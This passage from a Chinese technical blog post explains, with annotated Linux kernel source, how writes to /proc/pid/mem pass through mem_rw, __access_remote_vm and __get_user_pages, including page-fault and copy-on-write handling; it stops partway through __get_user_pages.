<p>我们从<code>write</code>开始分析。对文件的任何操作都要走文件所在的文件系统在 VFS 上注册好的虚表<code>file_operations</code>，而<code>/proc</code>上的文件是由 procfs 实现的，找到<code>proc_mem_operations</code>，可以看到<code>write</code>会被绑定倒<code>mem_write</code>上</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">proc_mem_operations</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">llseek</span>		<span class="o">=</span> <span class="n">mem_lseek</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">read</span>		<span class="o">=</span> <span class="n">mem_read</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">write</span>		<span class="o">=</span> <span class="n">mem_write</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">open</span>		<span class="o">=</span> <span class="n">mem_open</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">release</span>	<span class="o">=</span> <span class="n">mem_release</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p><code>mem_write</code>是对<code>mem_rw</code>的一个 wrap（<code>write</code>标志置为 1），<code>mem_rw</code>的主要流程是</p>
<ul>
<li>首先<code>__get_free_page</code>申请一个临时的空闲页充当缓冲区</li>
<li>若为写操作，调用<code>copy_from_user</code>将待写的数据拷贝到临时页</li>
<li>然后<code>access_remote_vm</code>读取目标数据到空闲页（读）或将缓冲区的内容写到目标地址（写）
<ul>
<li>所谓 remote，其实是因为本进程有可能会去读写其他进程的内存映射文件，也就代表了进程可能会去访问其他进程的地址空间，这点和其他 memory filesystem 不同</li>
</ul>
</li>
<li>若为读操作，那么将上一步读到空闲页的数据写回用户的缓冲区中</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">mem_rw</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span> <span class="o">=</span> <span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">ssize_t</span> <span class="n">copied</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mm</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">__get_free_page</span><span class="p">(</span><span class="n">GFP_TEMPORARY</span><span class="p">);</span>	<span class="c1">// 申请临时空闲页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">copied</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">atomic_inc_not_zero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">mm_users</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">free</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">this_len</span> <span class="o">=</span> <span class="kt">min_t</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>	<span class="c1">// 本次读取/写入数据长度，单次最大为PAGE_SIZE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">write</span> <span class="o">&amp;&amp;</span> <span class="nf">copy_from_user</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">this_len</span><span class="p">))</span> <span class="p">{</span>		<span class="c1">// 若是写操作，从用户空间拷贝待写数据到临时空闲页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">this_len</span> <span class="o">=</span> <span class="nf">access_remote_vm</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">this_len</span><span class="p">,</span> <span class="n">write</span><span class="p">);</span>	<span class="c1">// 读取/写入数据到临时空闲页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this_len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copied</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">write</span> <span class="o">&amp;&amp;</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">this_len</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 若是读操作，将读取到的数据从临时空闲页面拷贝数据到用户空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">copied</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">buf</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">addr</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">copied</span> <span class="o">+=</span> <span class="n">this_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">count</span> <span class="o">-=</span> <span class="n">this_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">ppos</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">mmput</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nl">free</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nf">free_page</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">page</span><span class="p">);</span>	<span class="c1">// 释放临时空闲页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="n">copied</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h5 id="__access_remote_vm">__access_remote_vm</h5>
<p><code>access_remote_vm</code>是对<code>__access_remote_vm</code>的 wrap，主要流程是</p>
<ul>
<li><code>get_user_pages</code>获取地址目标<code>addr</code>所在的 page struct</li>
<li>若获取成功，调用<code>kmap</code>将 page 映射进内核的 high memory（page 所指代的是物理页面）</li>
<li>若内存访问是写操作，那就将数据写入后置脏位，若是读操作就将数据读入即可</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">__access_remote_vm</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">down_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">mmap_sem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* ignore errors, just check how much was successfully transferred */</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">void</span> <span class="o">*</span><span class="n">maddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">ret</span> <span class="o">=</span> <span class="nf">get_user_pages</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span> <span class="n">mm</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>		<span class="c1">// 获取addr对应的page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="n">write</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vma</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>		<span class="c1">// 获取失败
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#ifndef CONFIG_HAVE_IOREMAP_PROT
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#else
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * we can access using slightly different code.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="n">vma</span> <span class="o">=</span> <span class="nf">find_vma</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vma</span> <span class="o">||</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span> <span class="o">&gt;</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_ops</span> <span class="o">&amp;&amp;</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_ops</span><span class="o">-&gt;</span><span class="n">access</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="n">ret</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_ops</span><span class="o">-&gt;</span><span class="nf">access</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">							  <span class="n">len</span><span class="p">,</span> <span class="n">write</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">bytes</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>	<span class="c1">// 获取成功
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">bytes</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">PAGE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">bytes</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="n">bytes</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="o">-</span><span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">maddr</span> <span class="o">=</span> <span class="nf">kmap</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>		<span class="c1">// 映射page到内核空间，因为我们获取的是page结构体，需要映射到一个虚拟地址之后才能进行写入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">// 如果是写操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="nf">copy_to_user_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span>		<span class="c1">// 将buf的数据拷贝到page中，完成写入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						  <span class="n">maddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="nf">set_page_dirty_lock</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>	<span class="c1">// 设置页面为脏页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>		<span class="c1">// 如果是读操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="nf">copy_from_user_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						    <span class="n">buf</span><span class="p">,</span> <span class="n">maddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nf">kunmap</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">len</span> <span class="o">-=</span> <span class="n">bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">buf</span> <span class="o">+=</span> <span class="n">bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">addr</span> <span class="o">+=</span> <span class="n">bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">up_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">mmap_sem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">buf</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h5 id="__get_user_pages">__get_user_pages</h5>
<p>以上就是 procfs 读写操作的 overview 了。下面我们从<code>get_user_pages</code>开始切入</p>
<p><code>get_user_pages</code>是<code>__get_user_pages_locked</code>的 wrap，而后者调用了<code>__get_user_pages</code>才是逻辑主体，其流程如下</p>
<ul>
<li>首先遍历要操作的页面并做一些前期准备，包括设置每个页面的权限位图<code>foll_flags</code></li>
<li>若为第一次迭代或起始地址大于当前 vma 基址，<code>find_extend_vma</code>获取起始地址所在的 vma</li>
<li>若进程没有收到或屏蔽致命信号，<code>follow_page_mask</code>获取虚拟地址对应的物理页的 page struct
<ul>
<li>通常页面都不在内存中，即第一次访问页面会造成缺页</li>
<li>另外，若没有对该页面的操作权限，同样会引起异常</li>
<li>此外还有 OOM、硬件故障等其他原因，这里不关心</li>
</ul>
</li>
<li>若没能获取成功且不是故障（返回 0），调用<code>faultin_page</code>处理缺页异常。完成处理成功后跳回<code>follow_page_mask</code>重试页面获取</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">__get_user_pages</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">tsk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nr_pages</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">gup_flags</span><span class="p">,</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">**</span><span class="n">pages</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">**</span><span class="n">vmas</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">nonblocking</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">page_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">nr_pages</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">VM_BUG_ON</span><span class="p">(</span><span class="o">!!</span><span class="n">pages</span> <span class="o">!=</span> <span class="o">!!</span><span class="p">(</span><span class="n">gup_flags</span> <span class="o">&amp;</span> <span class="n">FOLL_GET</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * If FOLL_FORCE is set then do not force a full fault as the hinting
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * fault information is unrelated to the reference behaviour of a task
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * using the address space
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">gup_flags</span> <span class="o">&amp;</span> <span class="n">FOLL_FORCE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">gup_flags</span> <span class="o">|=</span> <span class="n">FOLL_NUMA</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">foll_flags</span> <span class="o">=</span> <span class="n">gup_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">page_increm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/* first iteration or cross vma bound */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vma</span> <span class="o">||</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_end</span><span class="p">)</span> <span class="p">{</span>		<span class="c1">// 若vma为空（第一次迭代）或者start超出vma的范围
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">vma</span> <span class="o">=</span> <span class="nf">find_extend_vma</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">start</span><span class="p">);</span>	<span class="c1">// 查找start所在的vma
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vma</span> <span class="o">&amp;&amp;</span> <span class="nf">in_gate_area</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">start</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="n">ret</span> <span class="o">=</span> <span class="nf">get_gate_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">start</span> <span class="o">&amp;</span> <span class="n">PAGE_MASK</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="n">gup_flags</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="n">pages</span> <span class="o">?</span> <span class="o">&amp;</span><span class="n">pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">:</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">					<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="o">:</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="n">page_mask</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">goto</span> <span class="n">next_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vma</span> <span class="o">||</span> <span class="nf">check_vma_flags</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">gup_flags</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="o">:</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nf">is_vm_hugetlb_page</span><span class="p">(</span><span class="n">vma</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="n">i</span> <span class="o">=</span> <span class="nf">follow_hugetlb_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">pages</span><span class="p">,</span> <span class="n">vmas</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="o">&amp;</span><span class="n">start</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nr_pages</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="n">gup_flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">retry</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * If we have a pending SIGKILL, don&#39;t keep faulting pages and
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * potentially allocating memory.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">fatal_signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">i</span> <span class="o">?</span> <span class="nl">i</span> <span class="p">:</span> <span class="o">-</span><span class="n">ERESTARTSYS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nf">cond_resched</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="n">page</span> <span class="o">=</span> <span class="nf">follow_page_mask</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">foll_flags</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">page_mask</span><span class="p">);</span>	<span class="c1">// 获取虚拟地址对应的物理页的page struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">// 获取失败，可能是没有对应页，也可能是没有相应操作权限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">ret</span> <span class="o">=</span> <span class="nf">faultin_page</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">foll_flags</span><span class="p">,</span>	<span class="c1">// 处理缺页异常，COW机制建映射得到一个新的可写的anon page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="n">nonblocking</span><span class="p">);</span>								<span class="c1">// 若没有写权限其会取消掉foll_flags中的写标志并返回0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">switch</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>		<span class="c1">// 缺页异常处理成功，重新尝试获取page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="k">goto</span> <span class="n">retry</span><span class="p">;</span>
